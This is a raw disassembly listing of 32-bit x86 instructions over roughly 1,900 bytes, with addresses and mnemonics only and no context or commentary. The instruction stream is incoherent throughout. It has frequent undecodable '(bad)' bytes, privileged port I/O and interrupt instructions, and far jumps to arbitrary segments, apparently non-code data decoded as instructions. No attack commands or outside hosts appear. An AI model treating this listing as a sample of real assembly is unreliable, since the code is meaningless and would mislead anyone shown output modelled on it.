  41363e:	mov    ebp,edx
  413640:	jmp    0x6a4a:0x87c286eb
  413647:	mov    ds:0x249a9a11,eax
  41364c:	and    DWORD PTR [edx],ecx
  41364e:	cmp    al,0xfb
  413650:	dec    ecx
  413651:	pop    eax
  413652:	and    ecx,DWORD PTR [edi+0x49]
  413655:	add    bh,BYTE PTR [esi-0x7c]
  413658:	mov    ebp,0xa4aa6fe
  41365d:	outs   dx,BYTE PTR ds:[esi]
  41365e:	cdq    
  41365f:	out    dx,eax
  413660:	cli    
  413661:	loop   0x413658
  413663:	fdivr  DWORD PTR [ebp-0x70]
  413666:	dec    eax
  413667:	xchg   ebx,eax
  413668:	fist   DWORD PTR [edx-0x9]
  41366b:	cmc    
  41366c:	push   ebp
  41366d:	scas   eax,DWORD PTR es:[edi]
  41366e:	jp     0x41369f
  413670:	xor    BYTE PTR [eax],bl
  413672:	jne    0x413632
  413674:	dec    edi
  413675:	out    dx,al
  413676:	scas   al,BYTE PTR es:[edi]
  413677:	adc    ah,BYTE PTR [edi-0xada8520]
  41367d:	cmp    BYTE PTR [eax+0x71],bh
  413680:	or     eax,0xd5026b46
  413685:	call   0xd560:0xa8f1fe40
  41368c:	jecxz  0x41362d
  41368e:	mov    DWORD PTR [edi+0x71],ebp
  413691:	adc    DWORD PTR [eax+0x15bf733f],ebp
  413697:	push   edi
  413698:	clc    
  413699:	xchg   ecx,eax
  41369a:	bswap  ecx
  41369c:	lds    ecx,FWORD PTR [edi]
  41369e:	mov    al,ds:0xd811d547
  4136a3:	mov    esi,0x44715db5
  4136a8:	xor    ecx,DWORD PTR [edi+0x8]
  4136ab:	imul   BYTE PTR [edx-0x1676a789]
  4136b1:	fild   DWORD PTR cs:[ebx-0xb0bcb14]
  4136b8:	outs   dx,DWORD PTR ds:[esi]
  4136b9:	(bad)  
  4136ba:	outs   dx,BYTE PTR ds:[esi]
  4136bb:	sub    dh,dh
  4136bd:	xchg   DWORD PTR [ebx-0x320f8f78],edi
  4136c3:	std    
  4136c4:	pop    ecx
  4136c5:	into   
  4136c6:	sub    ecx,DWORD PTR [edx]
  4136c8:	dec    eax
  4136c9:	add    al,0xb1
  4136cb:	ins    BYTE PTR es:[edi],dx
  4136cc:	inc    eax
  4136cd:	pop    edi
  4136ce:	add    BYTE PTR [ebx],ch
  4136d0:	test   al,0x60
  4136d2:	ret    
  4136d3:	pop    edi
  4136d4:	repnz popf 
  4136d6:	mov    ebp,0xd4b1c79d
  4136db:	jge    0x4136c4
  4136dd:	in     al,0xe3
  4136df:	mov    esp,ebx
  4136e1:	mov    DWORD PTR [esp+ebx*4],esp
  4136e4:	loopne 0x41367e
  4136e6:	popa   
  4136e7:	push   eax
  4136e8:	mov    eax,ds:0x9c9d2c47
  4136ed:	(bad)  
  4136ee:	popa   
  4136ef:	xor    DWORD PTR [edi+0x6876a6b2],ecx
  4136f5:	sbb    al,0xce
  4136f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f8:	pop    ebp
  4136f9:	dec    esi
  4136fa:	add    al,0x43
  4136fc:	(bad)  
  4136fd:	je     0x413720
  4136ff:	mov    ah,BYTE PTR [ecx-0x7a]
  413702:	dec    ebx
  413703:	jl     0x41368e
  413705:	push   ebp
  413706:	adc    cl,bl
  413708:	mov    ecx,0x29004a34
  41370d:	inc    esi
  41370e:	fisttp DWORD PTR [esi-0xa]
  413711:	in     al,dx
  413712:	xor    edi,DWORD PTR [esi-0x63f94373]
  413718:	loop   0x413785
  41371a:	mov    edx,0xa4d46ee2
  41371f:	mul    BYTE PTR [edi-0x60]
  413722:	popa   
  413723:	iret   
  413724:	push   ecx
  413725:	xor    eax,0x6bad5107
  41372a:	xor    BYTE PTR [esp+ebp*1],dl
  41372d:	adc    esp,ecx
  41372f:	(bad)  
  413730:	ins    BYTE PTR es:[edi],dx
  413731:	call   0xf40fab8c
  413736:	or     eax,0x3da09058
  41373b:	les    eax,FWORD PTR [edi+0x24]
  41373e:	out    dx,al
  41373f:	fnstsw WORD PTR [edx]
  413741:	mov    BYTE PTR [ebx-0x52],al
  413744:	inc    ecx
  413745:	or     cl,BYTE PTR [edi+0x46]
  413748:	mov    cs,WORD PTR [eax+edx*2-0x7e]
  41374c:	imul   esi,DWORD PTR [eax],0xffffffda
  41374f:	cdq    
  413750:	and    al,BYTE PTR [esp+eax*2+0x651a81b2]
  413757:	sub    ebp,esp
  413759:	out    0x3e,al
  41375b:	mov    fs,esp
  41375d:	xchg   ecx,eax
  41375e:	(bad)  
  41375f:	fmul   st,st(3)
  413761:	dec    ebx
  413762:	stc    
  413763:	mov    ah,0x9a
  413765:	jmp    0x507ed198
  41376a:	arpl   WORD PTR [esi-0x8],di
  41376d:	pop    ecx
  41376e:	xchg   esi,eax
  41376f:	mov    eax,ds:0x6235d055
  413774:	shl    DWORD PTR [ecx-0x4a50b24c],cl
  41377a:	inc    eax
  41377b:	ret    
  41377c:	mov    edi,edi
  41377e:	pop    esp
  41377f:	mov    eax,0x5d696028
  413784:	(bad)  
  413785:	jb     0x413768
  413787:	stos   DWORD PTR es:[di],eax
  413789:	sub    eax,0x58013b06
  41378e:	iret   
  41378f:	outs   dx,BYTE PTR ds:[esi]
  413790:	jle    0x413725
  413792:	add    edx,DWORD PTR [edi+eax*2]
  413795:	pusha  
  413796:	xor    ecx,DWORD PTR [edx]
  413798:	mov    bh,0x17
  41379a:	add    cl,BYTE PTR [ecx+0x68]
  41379d:	int    0x4d
  41379f:	ja     0x413759
  4137a1:	lea    ebx,[ecx+eax*8+0x7eb04426]
  4137a8:	retf   0x6f1f
  4137ab:	cmp    DWORD PTR [edi+eax*8+0x2cac6dc3],eax
  4137b2:	mov    edi,0x55c0514
  4137b7:	and    eax,0x6e2320fc
  4137bc:	adc    ebp,esp
  4137be:	stos   DWORD PTR es:[edi],eax
  4137bf:	aaa    
  4137c0:	xchg   ecx,eax
  4137c1:	sub    BYTE PTR [edx+0x5d03ae8b],dl
  4137c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c8:	imul   edx,ebx,0xfd9d867e
  4137ce:	rol    BYTE PTR [eax+edi*4-0x22],cl
  4137d2:	out    dx,eax
  4137d3:	and    al,0xa9
  4137d5:	mov    esi,esi
  4137d7:	xor    ebp,ebx
  4137d9:	sub    esp,DWORD PTR [edi+0x71]
  4137dc:	xor    eax,0x27792fd9
  4137e1:	jle    0x41379f
  4137e3:	je     0x413834
  4137e5:	xor    bh,0xd5
  4137e8:	retf   0x3b00
  4137eb:	retf   
  4137ec:	in     eax,dx
  4137ed:	ins    DWORD PTR es:[edi],dx
  4137ee:	cmp    al,BYTE PTR [edx+0x77]
  4137f1:	inc    edi
  4137f2:	(bad)  
  4137f3:	clc    
  4137f4:	addr16 pushf 
  4137f6:	mov    bl,0xf8
  4137f8:	and    ecx,DWORD PTR [esi]
  4137fa:	stos   DWORD PTR es:[edi],eax
  4137fb:	pusha  
  4137fc:	jae    0x41378b
  4137fe:	sub    ebp,DWORD PTR [ebp+0x37bec1bc]
  413804:	jecxz  0x4137ea
  413806:	sbb    bl,BYTE PTR [ebp+ecx*2+0xa9966f9]
  41380d:	test   BYTE PTR ss:0x9d7fbeed,al
  413814:	jno    0x413887
  413816:	pop    ds
  413817:	push   esp
  413818:	pushf  
  413819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41381a:	push   edx
  41381b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41381c:	mov    BYTE PTR [esi+0x69c58c00],dl
  413822:	adc    eax,0x2aa3d056
  413827:	test   eax,esi
  413829:	jae    0x413841
  41382b:	add    ah,BYTE PTR [ecx+0x71]
  41382e:	push   edx
  41382f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413830:	nop
  413831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413832:	int    0x3f
  413834:	push   esp
  413835:	cmp    ah,BYTE PTR fs:[edx-0x43e874fd]
  41383c:	bound  ebx,QWORD PTR [ecx-0x1b1d330a]
  413842:	jl     0x413889
  413844:	jmp    0x9f92:0x2667e90d
  41384b:	mov    al,BYTE PTR [ecx-0x3a71e8e5]
  413851:	xor    dl,dh
  413853:	test   DWORD PTR [esi],ebx
  413855:	ins    BYTE PTR es:[edi],dx
  413856:	pop    esi
  413857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413858:	mov    ds:0x33284f27,eax
  41385d:	mov    dl,0xc5
  41385f:	fidivr WORD PTR [edi]
  413861:	mov    fs,WORD PTR [edi+esi*2+0x51]
  413865:	jg     0x413838
  413867:	test   eax,0xd962cd61
  41386c:	mov    ds:0xf1508019,al
  413871:	sti    
  413872:	aam    0x6b
  413874:	out    dx,eax
  413875:	pop    ds
  413876:	and    al,0xaa
  413878:	add    BYTE PTR [edi-0x53],cl
  41387b:	jnp    0x413855
  41387d:	inc    esp
  41387e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41387f:	aas    
  413880:	sar    BYTE PTR [esi-0x78809cab],1
  413886:	mov    ds:0x664ed8c7,al
  41388b:	(bad)  
  41388c:	push   ebp
  41388d:	lods   al,BYTE PTR ds:[esi]
  41388e:	hlt    
  41388f:	push   esp
  413890:	mov    ds:0xd0545691,eax
  413895:	fwait
  413896:	sbb    edi,DWORD PTR [eax]
  413898:	shl    al,cl
  41389a:	push   cs
  41389b:	xchg   esp,eax
  41389c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41389d:	dec    ecx
  41389e:	pop    esi
  41389f:	stos   DWORD PTR es:[edi],eax
  4138a0:	in     eax,0xec
  4138a2:	xchg   esp,eax
  4138a3:	mov    ah,0xe7
  4138a5:	jp     0x4138e1
  4138a7:	leave  
  4138a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138a9:	dec    eax
  4138aa:	dec    ebp
  4138ab:	mov    BYTE PTR [eax-0x63cd667b],al
  4138b1:	xchg   BYTE PTR [edi+0xf46a7d6],bh
  4138b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138b8:	pop    eax
  4138b9:	xor    ah,ch
  4138bb:	or     BYTE PTR [ecx+eax*8+0x4a703e9a],ch
  4138c2:	stc    
  4138c3:	lds    ebx,FWORD PTR [eax+0x3b]
  4138c6:	jge    0x4138e8
  4138c8:	lahf   
  4138c9:	mov    dl,0x9a
  4138cb:	mov    ds:0x2f6b8f69,eax
  4138d0:	or     ebx,DWORD PTR [ecx+0x3b]
  4138d3:	ror    ecx,0x69
  4138d6:	imul   eax,DWORD PTR gs:[edi-0x5f],0x49
  4138db:	xor    BYTE PTR [eax+0x76e2dc01],bh
  4138e1:	xchg   ebx,eax
  4138e2:	xchg   DWORD PTR [ebp-0x79],esp
  4138e5:	or     al,0xa2
  4138e7:	mov    dh,0x5
  4138e9:	jl     0x4138b3
  4138eb:	sahf   
  4138ec:	jp     0x413955
  4138ee:	jne    0x413943
  4138f0:	xor    DWORD PTR [ebx-0x31],0x304f8e4c
  4138f7:	test   al,0x11
  4138f9:	pusha  
  4138fa:	add    dl,al
  4138fc:	fwait
  4138fd:	xchg   esp,eax
  4138fe:	and    ebp,DWORD PTR [ebx+esi*8-0x29]
  413902:	cld    
  413903:	pmuludq mm1,QWORD PTR [ebp+0x6]
  413907:	mov    DWORD PTR [edx+0x56],eax
  41390a:	bound  edi,QWORD PTR [edx+0x15]
  41390d:	cwde   
  41390e:	cmp    DWORD PTR [edx+eax*1+0x3050ac93],ebp
  413915:	inc    ebx
  413916:	daa    
  413917:	std    
  413918:	jg     0x413954
  41391a:	sub    edi,DWORD PTR [esi]
  41391c:	cwde   
  41391d:	push   ds
  41391e:	xor    esp,DWORD PTR ds:0x12ebb732
  413924:	(bad)  
  413925:	cmp    al,0xcc
  413927:	and    BYTE PTR [ecx-0xec09b00],ch
  41392d:	mov    bl,0x57
  41392f:	pop    ebx
  413930:	adc    DWORD PTR [esi+eiz*4-0x3f],esi
  413934:	mov    dh,0xa1
  413936:	cmp    edx,DWORD PTR [esp+eax*4+0x15]
  41393a:	inc    esp
  41393b:	fisttp DWORD PTR [esi-0x38]
  41393e:	adc    DWORD PTR [edx-0xb44858d],eax
  413944:	retf   
  413945:	mov    ebx,0xfa6f17e0
  41394a:	or     BYTE PTR [eax-0x529d659c],ch
  413950:	jge    0x4139d1
  413952:	sbb    BYTE PTR [ecx+0x2e937d5a],0x10
  413959:	(bad)  
  41395a:	sbb    eax,0x9ea0a25f
  41395f:	outs   dx,BYTE PTR ds:[esi]
  413960:	icebp  
  413961:	rol    BYTE PTR [edi],cl
  413963:	sbb    al,0xbe
  413965:	jle    0x413954
  413967:	mov    dl,BYTE PTR [ecx*1-0x3a2983e0]
  41396e:	std    
  41396f:	repz adc eax,0x82701542
  413975:	not    dh
  413977:	xchg   edx,eax
  413978:	dec    edi
  413979:	jmp    0x41394f
  41397b:	push   edi
  41397c:	sbb    al,0x7e
  41397e:	xor    dl,BYTE PTR [ebp-0x1624ed14]
  413984:	test   BYTE PTR [edx],bh
  413986:	inc    eax
  413987:	rol    BYTE PTR [ebp-0x14],0x3d
  41398b:	rcl    DWORD PTR [ebx+0x74c5c7b8],1
  413991:	shr    ebp,0x52
  413994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413995:	mov    bh,BYTE PTR [edi]
  413997:	xor    DWORD PTR [ecx-0x13db49c7],ecx
  41399d:	retf   0x4f2c
  4139a0:	dec    esi
  4139a1:	aam    0x26
  4139a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a4:	jb     0x413943
  4139a6:	sbb    bh,BYTE PTR [esi+0x37]
  4139a9:	inc    edx
  4139aa:	in     al,0x53
  4139ac:	daa    
  4139ad:	ins    BYTE PTR es:[edi],dx
  4139ae:	mov    ah,0x7c
  4139b0:	or     cl,ch
  4139b2:	xchg   ecx,eax
  4139b3:	aam    0x5
  4139b5:	call   FWORD PTR [ecx]
  4139b7:	and    BYTE PTR [ebx-0x73],cl
  4139ba:	pop    edi
  4139bb:	xor    eax,0xeb8b8e66
  4139c0:	xchg   esi,eax
  4139c1:	pushf  
  4139c2:	lock or edx,DWORD PTR [ecx-0x73534379]
  4139c9:	jp     0x4139ed
  4139cb:	loop   0x4139e0
  4139cd:	stos   BYTE PTR es:[edi],al
  4139ce:	ror    BYTE PTR [ecx+0x6ab10f68],1
  4139d4:	mov    ebx,0x5310d37d
  4139d9:	int3   
  4139da:	scas   al,BYTE PTR es:[edi]
  4139db:	mov    esp,0x3625ecbf
  4139e0:	cmp    eax,0x7707200c
  4139e5:	jl     0x413a2c
  4139e7:	xchg   ebx,eax
  4139e8:	mov    bl,0x3e
  4139ea:	mul    DWORD PTR [ebx]
  4139ec:	out    0xa0,al
  4139ee:	sub    BYTE PTR [eax-0x15],cl
  4139f1:	inc    esp
  4139f2:	and    bl,dh
  4139f4:	lods   eax,DWORD PTR ds:[esi]
  4139f5:	pusha  
  4139f6:	ror    cx,1
  4139f9:	out    0x54,al
  4139fb:	mov    ch,0x3c
  4139fd:	sbb    eax,DWORD PTR [ecx+0x65]
  413a00:	ret    
  413a01:	mov    ch,BYTE PTR [edx-0x52f6bfa]
  413a07:	rcl    DWORD PTR [ebx],cl
  413a09:	(bad)  
  413a0a:	adc    BYTE PTR [eax-0x5b5a9b10],ch
  413a10:	xchg   edi,eax
  413a11:	scas   al,BYTE PTR es:[edi]
  413a12:	sub    DWORD PTR [esi+0x53],ebp
  413a15:	jno    0x4139cb
  413a17:	pop    ss
  413a18:	mov    al,0x70
  413a1a:	xor    esp,DWORD PTR [eax+0x32894e8a]
  413a20:	gs ins BYTE PTR es:[edi],dx
  413a22:	(bad)  
  413a23:	repz add ebp,DWORD PTR [ebp-0x1f]
  413a27:	fisub  WORD PTR [ebx+0x1c]
  413a2a:	pop    ebp
  413a2b:	in     al,0x36
  413a2d:	adc    ch,cl
  413a2f:	sbb    BYTE PTR [eax],dl
  413a31:	stos   DWORD PTR es:[edi],eax
  413a32:	fimul  DWORD PTR [edx-0x13]
  413a35:	dec    esp
  413a36:	mov    al,ds:0x7fe74d96
  413a3b:	loop   0x413a3b
  413a3d:	lds    eax,FWORD PTR ds:0x55a66eef
  413a43:	sbb    al,0x73
  413a45:	inc    esp
  413a46:	xchg   edi,eax
  413a47:	jl     0x413a69
  413a49:	sbb    DWORD PTR [edi],eax
  413a4b:	pop    eax
  413a4c:	sub    DWORD PTR [esi+0x17c872ca],0x9945f54f
  413a56:	cs pop ecx
  413a58:	mov    DWORD PTR [eax],eax
  413a5a:	lahf   
  413a5b:	outs   dx,DWORD PTR ds:[esi]
  413a5c:	pop    edi
  413a5d:	imul   DWORD PTR [ebp-0x50]
  413a60:	push   esi
  413a61:	mov    bl,0x92
  413a63:	(bad)  [ecx-0x28]
  413a66:	pop    edi
  413a67:	aad    0xdd
  413a69:	mov    eax,0xd9a79dc4
  413a6e:	mov    esp,0x81b77b34
  413a73:	cmp    eax,0x4d3f8e18
  413a78:	sbb    BYTE PTR [eax+0x62],ah
  413a7b:	jg     0x413a0a
  413a7d:	pop    edx
  413a7e:	cmp    BYTE PTR [ebp-0x2e6a7a75],bl
  413a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a85:	js     0x413a44
  413a87:	adc    cl,BYTE PTR [ebp-0x582efeb9]
  413a8d:	add    esi,DWORD PTR [edi-0x61]
  413a90:	shl    BYTE PTR [esi],cl
  413a92:	in     al,dx
  413a93:	addr16 jle 0x413b0f
  413a96:	mov    DWORD PTR [ebp+0x6b9e41e7],ebx
  413a9c:	mov    ds:0x6178b5ea,al
  413aa1:	hlt    
  413aa2:	(bad)  
  413aa3:	mov    ch,BYTE PTR [edi+0x6d]
  413aa6:	and    al,0xee
  413aa8:	mov    dl,0xc2
  413aaa:	(bad)  
  413aab:	cmp    al,0xdc
  413aad:	xlat   BYTE PTR ds:[ebx]
  413aae:	dec    esp
  413aaf:	push   ecx
  413ab0:	loopne 0x413aeb
  413ab2:	jb     0x413a68
  413ab4:	sti    
  413ab5:	in     eax,0x72
  413ab7:	retf   0x755a
  413aba:	jp     0x413af1
  413abc:	fs jb  0x413ab8
  413abf:	jmp    0x413b0e
  413ac1:	push   edi
  413ac2:	push   cs
  413ac3:	and    al,0x66
  413ac5:	sub    DWORD PTR [esi+esi*2],esp
  413ac8:	mov    ch,0x61
  413aca:	or     eax,0x4aced379
  413acf:	add    edx,DWORD PTR [edi]
  413ad1:	das    
  413ad2:	mov    cl,0x1d
  413ad4:	(bad)  
  413ad5:	push   esp
  413ad6:	ds aad 0xac
  413ad9:	and    DWORD PTR ds:0x4d62d75c,edi
  413adf:	aad    0x50
  413ae1:	or     al,0x3f
  413ae3:	add    dl,BYTE PTR [ebx-0x23]
  413ae6:	sub    esp,ebp
  413ae8:	cdq    
  413ae9:	xlat   BYTE PTR ds:[ebx]
  413aea:	push   esp
  413aeb:	sbb    eax,0x4ea5f573
  413af0:	or     eax,eax
  413af2:	mov    esi,0xc1696dea
  413af7:	adc    eax,0xb7ec0cdf
  413afc:	push   es
  413afd:	loope  0x413b13
  413aff:	loope  0x413abb
  413b01:	push   0xffffffe4
  413b03:	nop
  413b04:	mov    esi,0x78f4bb6e
  413b09:	dec    edx
  413b0a:	xchg   BYTE PTR [edx-0x2c],bh
  413b0d:	xor    al,0x9f
  413b0f:	add    DWORD PTR [ebx+0x495b98ff],ecx
  413b15:	xchg   ecx,eax
  413b16:	and    eax,0x646bce15
  413b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b1c:	daa    
  413b1d:	lds    ebx,FWORD PTR [ebp-0x18]
  413b20:	pop    ss
  413b21:	es jne 0x413abf
  413b24:	fwait
  413b25:	mov    al,ds:0x769fe965
  413b2a:	xchg   esp,eax
  413b2b:	pop    es
  413b2c:	jge    0x413b03
  413b2e:	in     al,0x5a
  413b30:	adc    al,0xf4
  413b32:	les    esi,FWORD PTR [ecx]
  413b34:	push   ds
  413b35:	bound  edx,QWORD PTR [ebx]
  413b37:	adc    DWORD PTR ds:0xba7faa4d,ecx
  413b3d:	sbb    cl,ah
  413b3f:	sahf   
  413b40:	push   ebp
  413b41:	push   edx
  413b42:	das    
  413b43:	push   ebp
  413b44:	loope  0x413b3b
  413b46:	mov    al,ds:0x72aa3fa8
  413b4b:	icebp  
  413b4c:	in     al,0xb4
  413b4e:	arpl   WORD PTR [eax+0x69a41837],si
  413b54:	jb     0x413bd5
  413b56:	rcr    DWORD PTR [ebp+0xcf31464],0x4d
  413b5d:	in     al,dx
  413b5e:	add    ah,ah
  413b60:	out    0x9e,al
  413b62:	sub    eax,0x75f59a66
  413b67:	and    al,0xc4
  413b69:	adc    eax,DWORD PTR [ebp+0x2f]
  413b6c:	sbb    BYTE PTR [ebp-0xd35a747],cl
  413b72:	pop    ebp
  413b73:	cwde   
  413b74:	sbb    edi,DWORD PTR [ebx+0x7]
  413b77:	out    dx,al
  413b78:	xchg   edx,eax
  413b79:	shl    BYTE PTR [ecx],1
  413b7b:	loope  0x413b89
  413b7d:	mov    bl,0xa5
  413b7f:	xor    BYTE PTR [edx-0x2ec8a3e1],dl
  413b85:	xor    BYTE PTR [ebp+edi*8+0x7e77595e],bh
  413b8c:	in     al,dx
  413b8d:	xchg   esi,eax
  413b8e:	dec    ecx
  413b8f:	imul   eax,DWORD PTR [ecx],0x632cb00b
  413b95:	add    dh,cl
  413b97:	out    dx,eax
  413b98:	stos   DWORD PTR es:[edi],eax
  413b99:	ret    
  413b9a:	mov    ecx,0x96efc75c
  413b9f:	push   cs
  413ba0:	daa    
  413ba1:	xchg   BYTE PTR [ecx-0x17],cl
  413ba4:	and    ebx,0xffffffe8
  413ba7:	jmp    FWORD PTR [ecx+0x4e]
  413baa:	mov    DWORD PTR [ebx],esp
  413bac:	icebp  
  413bad:	lods   al,BYTE PTR ds:[esi]
  413bae:	jno    0x413c26
  413bb0:	add    DWORD PTR [ebx+0x11],0x75a5d997
  413bb7:	xor    eax,0xb2a392cd
  413bbc:	xchg   di,ax
  413bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bbf:	popa   
  413bc0:	loop   0x413c13
  413bc2:	mov    ebp,0xbc04cc5f
  413bc7:	cwde   
  413bc8:	cmc    
  413bc9:	mov    ch,BYTE PTR [edx+0x4c9181c8]
  413bcf:	imul   eax,DWORD PTR [esi-0x71],0x11
  413bd3:	shl    esi,0x7a
  413bd6:	pop    esp
  413bd7:	mov    eax,gs
  413bd9:	push   eax
  413bda:	pop    eax
  413bdb:	pusha  
  413bdc:	mov    edx,0x5b09ccc4
  413be1:	lods   al,BYTE PTR ds:[esi]
  413be2:	xchg   esp,eax
  413be3:	int3   
  413be4:	retf   0xec3
  413be7:	push   esi
  413be8:	frstor [edi-0xf81c159]
  413bee:	aaa    
  413bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bf0:	(bad)  
  413bf1:	or     eax,0x83f73778
  413bf6:	pop    ebp
  413bf7:	adc    BYTE PTR [edx+0x7e],bh
  413bfa:	adc    eax,0xc1997112
  413bff:	fs (bad) 
  413c01:	push   0xffffff9e
  413c03:	cmp    dh,BYTE PTR [edx+edi*4]
  413c06:	lds    edi,FWORD PTR [edi-0x54ba4153]
  413c0c:	adc    al,0xec
  413c0e:	mov    bh,0xf8
  413c10:	and    al,BYTE PTR [ebp-0x17786ab2]
  413c16:	push   es
  413c17:	repnz cmp esi,0x11
  413c1b:	and    DWORD PTR [ebp+0x57],eax
  413c1e:	push   ebx
  413c1f:	cli    
  413c20:	jae    0x413bbf
  413c22:	ret    0x95f5
  413c25:	(bad)  
  413c26:	inc    DWORD PTR [ebp+0x50a7f02e]
  413c2c:	pop    ebp
  413c2d:	out    dx,al
  413c2e:	(bad)  
  413c2f:	xor    dh,bh
  413c31:	jae    0x413bf0
  413c33:	repz and eax,DWORD PTR [ecx]
  413c36:	add    ebp,ebx
  413c38:	mov    eax,DWORD PTR [edx+0x38]
  413c3b:	xchg   ebp,eax
  413c3c:	ret    
  413c3d:	mov    BYTE PTR [eax],bh
  413c3f:	les    edi,FWORD PTR [ebp+0x50]
  413c42:	xchg   esi,eax
  413c43:	sub    DWORD PTR [ebp-0x36],esi
  413c46:	sub    DWORD PTR [ecx+0x47],edi
  413c49:	es sti 
  413c4b:	sahf   
  413c4c:	das    
  413c4d:	mov    eax,0x383ca2d4
  413c52:	int3   
  413c53:	js     0x413c88
  413c55:	adc    edx,ecx
  413c57:	inc    esp
  413c58:	jp     0x413c3d
  413c5a:	ret    
  413c5b:	vpsadbw xmm6,xmm7,XMMWORD PTR [ebx]
  413c5f:	cmp    BYTE PTR [ebp-0x5f02264],bl
  413c65:	jne    0x413ca7
  413c67:	fistp  QWORD PTR [edi-0x3ea67d0d]
  413c6d:	adc    dl,al
  413c6f:	or     al,0xc5
  413c71:	dec    eax
  413c72:	xor    al,0xa0
  413c74:	jbe    0x413c3b
  413c76:	push   ebx
  413c77:	add    cl,BYTE PTR [edi]
  413c79:	in     al,0x85
  413c7b:	add    dh,BYTE PTR ds:0x5d11270d
  413c81:	xchg   ecx,eax
  413c82:	daa    
  413c83:	(bad)  
  413c84:	ffreep st(4)
  413c86:	mov    cl,0xfa
  413c88:	cmp    BYTE PTR [esi],0xfa
  413c8b:	jle    0x413c31
  413c8d:	cmp    dl,BYTE PTR [edx+0x20dd1f5a]
  413c93:	shl    BYTE PTR [esi],0x91
  413c96:	shl    BYTE PTR [ebp-0x2b],0xbc
  413c9a:	or     ch,BYTE PTR [ebx+edi*8-0x7219c5dc]
  413ca1:	add    DWORD PTR [ebx],esp
  413ca3:	js     0x413c31
  413ca5:	(bad)  
  413ca6:	or     al,0xda
  413ca8:	push   ds
  413ca9:	cs xchg esp,eax
  413cab:	mov    ecx,0x3afe42c9
  413cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cb1:	cmp    al,0xf1
  413cb3:	call   FWORD PTR [ebx+0x74]
  413cb6:	je     0x413d08
  413cb8:	dec    edx
  413cb9:	aad    0xd3
  413cbb:	sub    eax,DWORD PTR [edi+ebp*8]
  413cbe:	test   al,0x70
  413cc0:	xchg   ebx,eax
  413cc1:	pop    esp
  413cc2:	addr16 push cs
  413cc4:	aam    0xb6
  413cc6:	mov    esi,0x55b75aa5
  413ccb:	pop    ss
  413ccc:	xchg   esp,eax
  413ccd:	adc    bl,BYTE PTR [edx+0x16]
  413cd0:	adc    esi,DWORD PTR [ebx+eiz*4]
  413cd3:	adc    al,0x69
  413cd5:	pop    esi
  413cd6:	fldcw  WORD PTR [ebx+0x45]
  413cd9:	sbb    eax,0x38527203
  413cde:	hlt    
  413cdf:	lods   eax,DWORD PTR ds:[esi]
  413ce0:	fwait
  413ce1:	(bad)  
  413ce2:	retf   
  413ce3:	repnz dec esi
  413ce5:	mov    esp,0xa3b5a659
  413cea:	call   0x3a910853
  413cef:	mov    DWORD PTR [ebp+0x2c],ebx
  413cf2:	pop    eax
  413cf3:	(bad)  
  413cf4:	sbb    BYTE PTR [ebx-0x30],ah
  413cf7:	daa    
  413cf8:	xor    cl,BYTE PTR [edx-0x60dee2b9]
  413cfe:	shr    DWORD PTR [edi],0xc4
  413d01:	adc    BYTE PTR ds:0xc082e37f,cl
  413d07:	out    dx,eax
  413d08:	push   0x78
  413d0a:	jg     0x413ca0
  413d0c:	imul   ebp,DWORD PTR [ebp+0x5351a079],0x9328d79b
  413d16:	and    eax,0x4fd74a9b
  413d1b:	inc    edx
  413d1c:	dec    edi
  413d1d:	std    
  413d1e:	and    al,0xbc
  413d20:	pop    esp
  413d21:	stos   BYTE PTR es:[edi],al
  413d22:	cmc    
  413d23:	adc    bl,BYTE PTR [ecx+0x1debf892]
  413d29:	inc    edx
  413d2a:	inc    esi
  413d2b:	push   ebx
  413d2c:	loop   0x413d81
  413d2e:	mov    ebp,0x65a9706f
  413d33:	call   DWORD PTR [edx]
  413d35:	fld    QWORD PTR [eax+0x2dddfc98]
  413d3b:	into   
  413d3c:	out    0x75,al
  413d3e:	add    esi,eax
  413d40:	and    esp,ecx
  413d42:	jne    0x413d8f
  413d44:	push   ds
  413d45:	adc    ah,bl
  413d47:	sub    ah,BYTE PTR [eax]
  413d49:	jp     0x413d66
  413d4b:	imul   esp,DWORD PTR [ebx+0x2211f140],0xfffffff1
  413d52:	jg     0x413d27
  413d54:	(bad)  
  413d55:	sbb    BYTE PTR [esi],bl
  413d57:	cli    
  413d58:	inc    ebp
  413d59:	loope  0x413d3a
  413d5b:	inc    esp
  413d5c:	mov    esp,0x6c35d248
  413d61:	and    ch,ah
  413d63:	adc    eax,0x7d07612b
  413d68:	mov    bh,0x82
  413d6a:	out    dx,eax
  413d6b:	pop    ss
  413d6c:	xchg   ecx,eax
  413d6d:	xor    dl,ch
  413d6f:	push   ecx
  413d70:	in     eax,dx
  413d71:	out    0x55,al
  413d73:	enter  0x2a51,0x81
  413d77:	jl     0x413d5a
  413d79:	sbb    bh,0xf0
  413d7c:	inc    ecx
  413d7d:	push   esi
  413d7e:	cmp    ebp,esp
  413d80:	add    esi,DWORD PTR [ebx+0x10]
  413d83:	pop    eax
  413d84:	push   es
  413d85:	xchg   edi,eax
  413d86:	mov    BYTE PTR [edi+0x3c429091],bh
  413d8c:	(bad)  [ecx+0x7128b208]
  413d92:	(bad)  [ecx*8+0x46d79dfe]
  413d99:	mov    dh,0x1
  413d9b:	xchg   ebx,eax
  413d9c:	mul    DWORD PTR [ecx+0x2d66c2d9]
  413da2:	popa   
  413da3:	je     0x413d59
  413da5:	pop    es
  413da6:	adc    DWORD PTR [edi-0x42d65d63],0x76de43d
  413db0:	xchg   DWORD PTR [eax-0x17],edx
